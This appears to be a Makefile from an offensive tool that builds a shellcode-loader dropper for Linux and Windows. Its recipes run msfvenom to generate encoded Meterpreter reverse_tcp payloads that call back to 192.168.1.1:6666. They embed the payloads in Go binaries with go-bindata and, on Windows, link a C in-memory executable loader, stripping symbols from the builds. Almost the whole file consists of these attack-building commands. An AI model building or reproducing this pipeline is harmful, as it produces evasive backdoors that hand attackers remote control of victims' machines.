go-bindata:
	go build -trimpath -x -v -ldflags "-s -w"

linux: clean go-bindata
	msfvenom -p  linux/x64/meterpreter/reverse_tcp  -e x86/shikata_ga_nai -i 1 lhost=192.168.1.1 lport=6666 -f elf > ./test
	./go-bindata -o ./linux/resource.go ./test
	cd linux && go build -trimpath  -x -v -ldflags "-s -w"
windows: clean go-bindata
	# msfvenom  -p  windows/meterpreter/reverse_tcp   LHOST=192.168.1.1  LPORT=6666   -f exe  > test.exe
	msfvenom  -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 1  LHOST=192.168.1.1  LPORT=6666   -f exe  > test.exe
	./go-bindata -o ./windows/resource.go ./test.exe
	cd windows && i686-w64-mingw32-gcc -c ./mm/MmLoadExe.c -o ./MmLoadExe.o
	cd windows && i686-w64-mingw32-ar   -crs libMmLoadExe.a MmLoadExe.o
	cd windows && CGO_ENABLED=1 CC=i686-w64-mingw32-gcc CXX=i686-w64-mingw32-g++ GOOS=windows GOARCH=386 go build -x -v -ldflags "-s -w"
	cd windows && rm libMmLoadExe.a MmLoadExe.o
	# cd windows && CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc CXX=x86_64-w64-mingw32-g++ GOOS=windows GOARCH=amd64 go build -trimpath -x -v -ldflags "-s -w"

clean:
	-rm go-bindata ./linux/linux ./linux/resource.go ./windows/windows.exe ./test ./test.exe ./windows/resource.go
